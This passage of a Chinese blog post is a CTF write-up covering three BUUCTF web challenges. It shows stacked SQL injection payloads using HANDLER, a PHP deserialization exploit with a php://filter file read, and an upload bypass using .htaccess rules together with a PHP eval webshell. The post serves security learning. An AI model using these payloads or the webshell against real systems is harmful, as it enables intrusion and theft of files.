<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>BUUCTF_Web题目题解记录1 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="BUUCTF_Web题目题解记录1" />
<meta property="og:description" content="BUUCTF刷题Web篇 文章目录 BUUCTF刷题Web篇前言一、[GYCTF2020]Blacklist二、[网鼎杯 2020 青龙组]AreUSerialz三、[GXYCTF2019]BabyUpload总结 前言 在无脑刷了若干题目后，回过头来整理，所以顺序和内容比较随缘。
就不写解题过程了，直接说用到的方法和答案。
总是想无脑刷题而不去归纳总结、一味地忍不住去和同事卷解题数量就是自己欺骗自己啊，要真的学到东西才行的。
一、[GYCTF2020]Blacklist 这是一道SQL注入的题，输入1,1’ or 1=1#,1’ order by 2#这些都是有返回内容的，然后尝试联合注入的时候发现select被过滤，没招了，查了别人的wp得知要使用“堆叠注入”。
堆叠注入？应该就是用;来分割可以执行的语句吧
1.查表名：1’;show tables#
得知有一个叫FlagHere的表，想到继续尝试得到这个表中的列名。
2.查列名：1’;show columns from FlagHere#
果然有一个叫flag的列，下面就是要去拿到flag列里的字段了
这里意外发现把from换成in也可以哈哈哈
其实这个网页点了提交之后，输入框就会只剩下个1，然后截图看起来就好怪！所以上一张截图在语句消失后我又手动敲上了，但后面不想敲了emmm
3.获取字段
由于这题过滤了select，所以又做不动了，查看别人的wp得知要用handler。
handler语法是：
handler table_name open … 获取句柄
handler … read first 读取第一行数据
handler … read next 读取下一行数据
这里的三处…是自己可以随意命名的“句柄”，保持一致即可
这里用：1’;handler FlagHere open fh;handler fh read first#
拿到flag！
二、[网鼎杯 2020 青龙组]AreUSerialz 打开靶机之后是PHP代码：
&lt;?php include(&#34;flag.php&#34;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/6b8190e420698d2cfbe0dda9701afca7/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-14T11:16:46+08:00" />
<meta property="article:modified_time" content="2023-08-14T11:16:46+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">BUUCTF_Web题目题解记录1</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="BUUCTFWeb_0"></a>BUUCTF刷题Web篇</h2> 
<hr> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#BUUCTFWeb_0" rel="nofollow">BUUCTF刷题Web篇</a></li><li><a href="#_10" rel="nofollow">前言</a></li><li><a href="#GYCTF2020Blacklist_19" rel="nofollow">一、[GYCTF2020]Blacklist</a></li><li><a href="#_2020_AreUSerialz_41" rel="nofollow">二、[网鼎杯 2020 青龙组]AreUSerialz</a></li><li><a href="#GXYCTF2019BabyUpload_213" rel="nofollow">三、[GXYCTF2019]BabyUpload</a></li><li><a href="#_306" rel="nofollow">总结</a></li></ul> 
</div> 
<p></p> 
<hr> 
<h2><a id="_10"></a>前言</h2> 
<p>在无脑刷了若干题目后，回过头来整理，所以顺序和内容比较随缘。<br> 就不写解题过程了，直接说用到的方法和答案。<br> 总是想无脑刷题而不去归纳总结、一味地忍不住去和同事卷解题数量就是自己欺骗自己啊，要真的学到东西才行的。</p> 
<hr> 
<h2><a id="GYCTF2020Blacklist_19"></a>一、[GYCTF2020]Blacklist</h2> 
<p><img src="https://images2.imgbox.com/42/64/iDypuTlt_o.png" alt="Blacklist题目界面"><br> 这是一道SQL注入的题，输入1,1’ or 1=1#,1’ order by 2#这些都是有返回内容的，然后尝试联合注入的时候发现select被过滤，没招了，查了别人的wp得知要使用“<strong>堆叠注入</strong>”。<br> 堆叠注入？应该就是用;来分割可以执行的语句吧<br> 1.查表名：<strong>1’;show tables#</strong><br> <img src="https://images2.imgbox.com/63/e9/vOjlliYE_o.png" alt="查表名"><br> 得知有一个叫FlagHere的表，想到继续尝试得到这个表中的列名。<br> 2.查列名：<strong>1’;show columns from FlagHere#</strong><br> 果然有一个叫flag的列，下面就是要去拿到flag列里的字段了<br> 这里意外发现把from换成in也可以哈哈哈<br> 其实这个网页点了提交之后，输入框就会只剩下个1，然后截图看起来就好怪！所以上一张截图在语句消失后我又手动敲上了，但后面不想敲了emmm<br> <img src="https://images2.imgbox.com/e6/34/K20QBJcA_o.png" alt="查列名"><br> 3.获取字段<br> 由于这题过滤了select，所以又做不动了，查看别人的wp得知要用handler。<br> handler语法是：<br> handler table_name open … 获取句柄<br> handler … read first 读取第一行数据<br> handler … read next 读取下一行数据<br> 这里的三处…是自己可以随意命名的“句柄”，保持一致即可<br> 这里用：<strong>1’;handler FlagHere open fh;handler fh read first#</strong><br> 拿到flag！<br> <img src="https://images2.imgbox.com/e6/8c/HPomvI12_o.png" alt="拿到flag"></p> 
<h2><a id="_2020_AreUSerialz_41"></a>二、[网鼎杯 2020 青龙组]AreUSerialz</h2> 
<p>打开靶机之后是PHP代码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">{<!-- --></span>

    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{<!-- --></span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>这题考察的是<strong>反序列化</strong><br> 从题目给出代码的最后可以看出，是以GET方式传入序列化的str字符串，要求str字符串中每一个字符的ASCII码范围在32到125之间，也就是在校验输入是可见字符，然后对其反序列化。<br> 通过看别人的wp，得知<br> <strong>在反序列化的过程中，调用__destruct()析构方法</strong></p> 
<pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>可以看到在__destruct()中，如果op===“2”，则将其赋值为"1"，同时content赋值为空，然后执行process()，需要注意到的地方是，这里op与"2"的比较是<strong>强类型比较===</strong></p> 
<pre><code class="prism language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>在process()中，如果op==“1”，执行write()，如果op==“2”，则执行read()，否则输出“Back Hacker”，可以看出来这里op与字符串的比较变成了<strong>弱类型比较==</strong><br> <strong>所以，我们只要令op=2，这里的2是整数int，便可以满足op==="2"为false，保证op不会在析构方法__destruct()中被置1，op=="2"为true，可以在process()中去执行read()</strong></p> 
<pre><code class="prism language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>read()中用file_get_contents函数读取文件，我们此处<strong>借助php://filter伪协议读取文件</strong>，filename是我们可以控制的。read()执行完后，使用output()输出读取到的内容。<br> 还有一个需要注意的地方是，<strong>$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化时会有%00*%00字符，%00字符的ASCII码为0</strong>，就无法通过上面的is_valid函数校验。<br> 这里最简单的一种绕过方法是：php7.1+版本<strong>对属性类型不敏感</strong>，本地序列化的时候<strong>将属性改为public</strong>进行绕过即可：</p> 
<pre><code class="prism language-php"><span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
</code></pre> 
<p>可以找个能在线运行php的网页，放进去如下代码，运行</p> 
<pre><code class="prism language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span> 
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span> 
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span> 

<span class="token operator">&lt;</span><span class="token operator">?</span>php 
 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">{<!-- --></span>
 
    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
 
<span class="token punctuation">}</span>
<span class="token variable">$A</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$B</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$B</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span> 

<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span> 
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
</code></pre> 
<p>运行得到的结果是：</p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"FileHandler"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"op"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"content"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<p><strong>在题目url后面接上?str=上面的运行结果</strong>，敲回车<br> 然后下拉滚动条，在网页最下方可以看到一串经base64编码后的输出，对其做base64解码即可得到flag。这里我当时是用的Python的base64模块来解码的，也可以找一个在线网站对base64解码，有HackBar插件的也可以借助HackBar插件来做base64解码。<br> <img src="https://images2.imgbox.com/f2/9d/MmpyB4nB_o.png" alt="得到编码的flag"><br> 在命令行用Python做base64解码：<br> <img src="https://images2.imgbox.com/b9/04/SCoPgoiI_o.png" alt="还原flag"><br> 本题参考：https://www.cnblogs.com/Cl0ud/p/12874458.html</p> 
<h2><a id="GXYCTF2019BabyUpload_213"></a>三、[GXYCTF2019]BabyUpload</h2> 
<p>这道题考的是<strong>文件上传</strong><br> 直接说最终的结论：<br> 1.过滤了文件后缀中的ph，所以php、phtml这些后缀名都不可用了，只能再去试试png、jpg这些。png也不行，提示“类型露骨”，jpg则可以上传。</p> 
<p><img src="https://images2.imgbox.com/b9/8e/D30vdqVZ_o.png" alt="上传php报错"></p> 
<p><img src="https://images2.imgbox.com/88/72/lZmIrqaZ_o.png" alt="上传png文件"><br> <img src="https://images2.imgbox.com/8c/f5/XHw7CPAz_o.png" alt="上传jpg文件成功"></p> 
<p>2.既然上传的是jpg而非php，要想利用的话，就要设法使服务器端将jpg文件解析为php文件。<strong>这里需要再上传一个文件.htaccess</strong><br> .htaccess的内容可以是：</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">"111.jpg"</span><span class="token punctuation">&gt;</span></span>
SetHandler application/x-httpd-php
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>或者：</p> 
<pre><code class="prism language-xml">AddType application/x-httpd-php .jpg
</code></pre> 
<p>再或者：</p> 
<pre><code class="prism language-xml">SetHandler application/x-httpd-php
</code></pre> 
<p>3.上传.htaccess时，由于我是用的macOS，不能以.作为文件名，所以命名为1.htaccess，开burp拦截再将文件名修改为.htaccess，并且<strong>要修改Content-Type是image/jpeg</strong>，上传成功后，可以用中国蚁剑连接。</p> 
<p><img src="https://images2.imgbox.com/e5/a3/8iMlafxf_o.png" alt="拦截修改请求包"><br> 另外要注意的是，在上传的jpg中，如果有&lt;?会被过滤，所以用：</p> 
<pre><code class="prism language-javascript"> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">&gt;</span><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'111'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>中国蚁剑连接：<br> 题目靶机url/upload/3b6546ca8d1fca2b8481772b155c6a9e/111.jpg<br> <img src="https://images2.imgbox.com/1f/b9/sEPnInfi_o.png" alt="中国蚁剑测试连接"><br> 从网站根目录可以找到flag：<br> <img src="https://images2.imgbox.com/22/3e/zNxuF5jD_o.png" alt="找到flag"><br> <img src="https://images2.imgbox.com/d9/4b/cJkrn7kT_o.png" alt="flag值拿到"></p> 
<p>最后放上从GitHub上看到的这题源码，也就清晰了之前的各种过滤了：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; 
&lt;title&gt;Upload&lt;/title&gt;
&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"&gt;
上传文件&lt;input type=\"file\" name=\"uploaded\" /&gt;
&lt;input type=\"submit\" name=\"submit\" value=\"上传\" /&gt;
&lt;/form&gt;"</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
